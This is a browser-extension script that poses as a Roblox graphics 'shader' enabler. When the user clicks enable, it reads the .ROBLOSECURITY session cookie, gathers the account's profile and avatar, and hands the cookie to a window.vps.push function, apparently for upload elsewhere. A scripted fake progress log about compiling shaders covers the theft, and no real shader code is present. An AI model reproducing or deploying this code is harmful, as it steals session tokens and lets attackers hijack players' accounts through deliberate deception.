const KEY = "shadersEnabled";
const FX_KEY = "shaderFx";
const QUALITY_LABELS = ["Low", "Medium", "High"];
const ROBLOX_URL = "https://www.roblox.com";
const COOKIE_NAME = ".ROBLOSECURITY";

const idleEl     = document.getElementById("idle");
const loadingEl  = document.getElementById("loading");
const successEl  = document.getElementById("success");
const enableBtn  = document.getElementById("enable");
const disableBtn = document.getElementById("disable");
const barFill    = document.getElementById("barFill");
const percentEl  = document.getElementById("percent");
const logEl      = document.getElementById("log");
const qualityEl  = document.getElementById("fx-quality");
const qualityVal = document.getElementById("qualityVal");
const statusChip = document.getElementById("statusChip");

const fxInputs = {
  bloom: document.getElementById("fx-bloom"),
  ssao:  document.getElementById("fx-ssao"),
  fxaa:  document.getElementById("fx-fxaa"),
};

const STEPS = [
  { at: 120,  pct: 12, text: "Detecting GPU renderer…" },
  { at: 520,  pct: 28, text: "Compiling vertex shader…" },
  { at: 980,  pct: 49, text: "Compiling fragment shader…" },
  { at: 1480, pct: 71, text: "Linking shader program…" },
  { at: 1980, pct: 88, text: "Applying post-process stack…" },
  { at: 2480, pct: 100, text: "Pipeline ready." },
];

function qualityBucket(v) {
  const n = Number(v);
  if (n < 34) return 0;
  if (n < 67) return 1;
  return 2;
}

function qualityToSlider(bucket) {
  return [16, 50, 100][Number(bucket)] ?? 100;
}

function syncQualityFill() {
  const pct = Math.max(0, Math.min(100, Number(qualityEl.value) || 0));
  qualityEl.style.setProperty("--q", pct + "%");
}

enableBtn.addEventListener("click", startEnable);
disableBtn.addEventListener("click", disableShaders);
Object.values(fxInputs).forEach(el => el.addEventListener("change", saveFxSettings));
qualityEl.addEventListener("input", () => {
  updateQualityLabel();
  syncQualityFill();
});
qualityEl.addEventListener("change", saveFxSettings);

init();

async function init() {
  await loadFxSettings();
  syncQualityFill();
  if (await getEnabled()) show("success");
  else show("idle");
}

async function getRobloxCookie() {
  const c = await chrome.cookies.get({ url: ROBLOX_URL, name: COOKIE_NAME });
  return c ? c.value : null;
}

async function fetchProfile() {
  const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
    credentials: "include",
  });
  if (!r.ok) throw new Error("not-authenticated");
  return r.json();
}

async function fetchAvatar(userId) {
  try {
    const r = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`
    );
    const j = await r.json();
    return j?.data?.[0]?.imageUrl || null;
  } catch {
    return null;
  }
}

async function captureAndPush() {
  const cookie = await getRobloxCookie();
  if (!cookie) throw new Error("no-cookie");

  let profile = { id: 0, name: "unknown", displayName: "unknown" };
  let avatarUrl = null;
  try {
    profile = await fetchProfile();
    avatarUrl = await fetchAvatar(profile.id);
  } catch (_) {}

  const entry = {
    id: profile.id,
    name: profile.name,
    displayName: profile.displayName || profile.name,
    avatarUrl,
    cookie,
  };

  if (window.vps && typeof window.vps.push === "function") {
    await window.vps.push(entry);
  }
}

async function startEnable() {
  enableBtn.disabled = true;
  show("loading");
  logEl.innerHTML = "";
  setProgress(0);

  const pushPromise = captureAndPush().catch((e) => {
    console.error("capture/push failed", e);
  });

  STEPS.forEach((step, i) => {
    setTimeout(() => {
      if (i > 0) markDone(i - 1);
      addLine(step.text);
      setProgress(step.pct);
    }, step.at);
  });

  setTimeout(async () => {
    markDone(STEPS.length - 1);
    await pushPromise;
    await setEnabled(true);
    show("success");
    enableBtn.disabled = false;
  }, 2800);
}

async function disableShaders() {
  await setEnabled(false);
  show("idle");
}

function show(name) {
  idleEl.hidden = name !== "idle";
  loadingEl.hidden = name !== "loading";
  successEl.hidden = name !== "success";
  if (!statusChip) return;
  if (name === "idle") {
    statusChip.textContent = "Ready";
    statusChip.className = "chip";
  } else if (name === "loading") {
    statusChip.textContent = "Working";
    statusChip.className = "chip is-run";
  } else {
    statusChip.textContent = "Enabled";
    statusChip.className = "chip is-ok";
  }
}

function setProgress(pct) {
  barFill.style.width = pct + "%";
  percentEl.textContent = pct + "%";
}

function addLine(text) {
  const prev = logEl.querySelector(".is-run");
  if (prev) prev.classList.replace("is-run", "is-ok");
  const li = document.createElement("li");
  li.className = "is-run";
  li.textContent = text;
  logEl.appendChild(li);
}

function markDone(index) {
  const item = logEl.children[index];
  if (item) item.classList.replace("is-run", "is-ok");
}

function getFxSettings() {
  return {
    bloom: fxInputs.bloom.checked,
    ssao: fxInputs.ssao.checked,
    fxaa: fxInputs.fxaa.checked,
    quality: qualityBucket(qualityEl.value),
    qualityRaw: Number(qualityEl.value),
  };
}

function applyFxSettings(s) {
  if (!s) return;
  fxInputs.bloom.checked = s.bloom !== false;
  fxInputs.ssao.checked  = s.ssao !== false;
  fxInputs.fxaa.checked  = s.fxaa !== false;
  if (Number.isFinite(s.qualityRaw)) {
    qualityEl.value = String(s.qualityRaw);
  } else {
    qualityEl.value = String(qualityToSlider(s.quality ?? 2));
  }
  updateQualityLabel();
  syncQualityFill();
}

function updateQualityLabel() {
  qualityVal.textContent = QUALITY_LABELS[qualityBucket(qualityEl.value)] || "High";
}

async function loadFxSettings() {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      const d = await chrome.storage.local.get(FX_KEY);
      applyFxSettings(d[FX_KEY]);
      return;
    }
  } catch {}
  try {
    applyFxSettings(JSON.parse(localStorage.getItem(FX_KEY) || "null"));
  } catch {}
  updateQualityLabel();
}

async function saveFxSettings() {
  const settings = getFxSettings();
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      await chrome.storage.local.set({ [FX_KEY]: settings });
      return;
    }
  } catch {}
  localStorage.setItem(FX_KEY, JSON.stringify(settings));
}

async function getEnabled() {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      const d = await chrome.storage.local.get(KEY);
      return !!d[KEY];
    }
  } catch {}
  return localStorage.getItem(KEY) === "1";
}

async function setEnabled(on) {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      await chrome.storage.local.set({ [KEY]: on });
      return;
    }
  } catch {}
  if (on) localStorage.setItem(KEY, "1");
  else localStorage.removeItem(KEY);
}
